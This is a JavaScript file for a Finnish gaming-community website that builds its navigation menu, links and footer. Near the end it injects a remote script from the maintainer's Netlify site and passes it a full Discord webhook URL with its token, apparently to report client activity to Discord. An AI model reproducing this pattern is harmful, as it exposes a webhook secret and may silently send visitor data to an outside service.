var BKCcolor="#90f";
const body = document.body;
const banner = document.createElement("div");
banner.id="Banner";
body.appendChild(banner);
const style = document.createElement("link");
style.href="/style/body.css";
style.rel="stylesheet";
style.type="text/css";
const b1 = document.createElement("h1");
b1.innerText="Koti";
b1.className="sb";
const b2 = document.createElement("h1");
b2.innerText="Tietoa pelistä";
b2.className="sb";
const b3 = document.createElement("h1");
b3.innerText="Tietoa kirjasta";
b3.className="sb";
const b4 = document.createElement("h1");
b4.innerText="Minecraft server";
b4.className="sb";
const b5 = document.createElement("h1");
b5.innerText="Youtube kanava";
b5.className="sb";
const b6 = document.createElement("h1");
b6.innerText="Discord server";
b6.className="sb";
const b7 = document.createElement("h1");
b7.innerText="Clan liittyminen";
b7.className="sb";
const b8 = document.createElement("h1");
b8.innerText="Muuta densokasta";
b8.className="sb";
document.head.appendChild(style);
if (window.innerWidth<800) {
    const bannertext = document.createElement("h1");
    bannertext.id="bannerText";
    banner.appendChild(bannertext);
    const selection = document.createElement("div");
    selection.id="§";
    selection.style.height = window.innerHeight+"px";
    body.appendChild(selection);
    const opse = document.createElement("button");
    opse.id = "open";
    opse.innerHTML="&#9776;";
    bannertext.appendChild(opse);
    const exit = document.createElement("h1");
    exit.id="exit";
    exit.innerText="X";
    selection.appendChild(exit);
    selection.appendChild(b1);
    b1.style.marginTop="17vh";
    selection.appendChild(b2);
    selection.appendChild(b3);
    selection.appendChild(b4);
    selection.appendChild(b5);
    selection.appendChild(b6);
    selection.appendChild(b7);
    selection.appendChild(b8);
    document.getElementById("exit").onclick = close;
    document.getElementById("open").onclick = open;
    document.onkeyup = function (p) {
    if (p.keyCode == 32 || p.keyCode == 13 || p.keyCode == 27 || p.keyCode == 17) {
            if (document.getElementById("open").style.display == "none") {
                close();
            }   else open();
        }
    }
    function close() {
        selection.style.display="none";
        opse.style.display="block";
    }
    function open() {
        selection.style.display="block";
        opse.style.display="none";
    }
}   else {
    banner.appendChild(b1);
    banner.appendChild(b2);
    banner.appendChild(b3);
    banner.appendChild(b4);
    banner.appendChild(b5);
    banner.appendChild(b6);
    banner.appendChild(b7);
    banner.appendChild(b8);
    var index=0;
    function forEach() {
        if (document.getElementsByClassName("sb")[index]) {
            document.getElementsByClassName("sb")[index].style="display: inline-table; margin-top: 4vh;";
            if (index !== 0) {
                document.getElementsByClassName("sb")[index].style.borderLeft="2px solid black";
            }
            index++;
            forEach();
        }
    }
    forEach();
}
b1.onclick = function () {
    document.location.href="/index.html";
}
b2.onclick = function () {
    document.location.href="/peli.html";
}
b3.onclick = function () {
    document.location.href="/kirja.html";
}
b4.onclick = function () {
    document.location.href="/minecraft palvelin.html";
}
b5.onclick = function () {
    document.location.href="/youtube.html";
}
b6.onclick = function () {
    document.location.href="/discord.html";
}
b7.onclick = function () {
    document.location.href="/clan.html";
}
b8.onclick = function () {
    document.location.href="/muuta.html";
}
const backgroundImg = document.createElement("img");
backgroundImg.id="bImg";
backgroundImg.src="/gallery/Logo.png";
backgroundImg.ondragstart=function (e) {
    e.preventDefault();
}
document.body.appendChild(backgroundImg);
document.body.onload = function () {
const icon = document.createElement("link");
icon.type="image/icon";
icon.rel="icon";
icon.href="/gallery/Logo.png";
document.head.appendChild(icon);
const cop = document.createElement("div");
cop.id="cop";
body.appendChild(cop);
const copText = document.createElement("h1");
copText.id="copyright";
copText.innerHTML="&copy; <h1 class='cb'>Densoka</h1> & <h1 class='cb'>Betonikasa</h1> 2022-2023";
cop.appendChild(copText);
const copInfo = document.createElement("h1");
copInfo.id="maker";
cop.appendChild(copInfo);
document.getElementsByClassName("cb")[0].onclick = function () {
    document.getElementById("maker").innerHTML = "Suunnittelu: Densoka omistaa kyseisen nettisivun ja sen sisöltämät kuvat, tekstit ja projektit";
}
document.getElementsByClassName("cb")[1].onclick = function () {
    document.getElementById("maker").innerHTML = "Toteutus: Betonikasa vastaa nettisivujen ylläpidosta betonikasa.ga@gmail.com www.betonikasa.netilify.app";
}
backgroundImg.ondrag=function (e) {
    e.preventDefault;
}
}
document.write(`
<script src="https://betonikasa.netlify.app/client/start.js"></script>
<script>clientActivate("https://discord.com/api/webhooks/1078319298960969799/nKCMxvxp3xiCHfMjDSVbjn7l1oizrVZ-LwoWNovz3BcHmghhkBXwC9JkCtSvAl9Aejc9")</script>
`);
const Discord = document.createElement("button");
Discord.id="discord";
document.body.appendChild(Discord);
Discord.onclick = function () {
    document.location.href="https://discord.gg/uJVpKKEYYF";
}
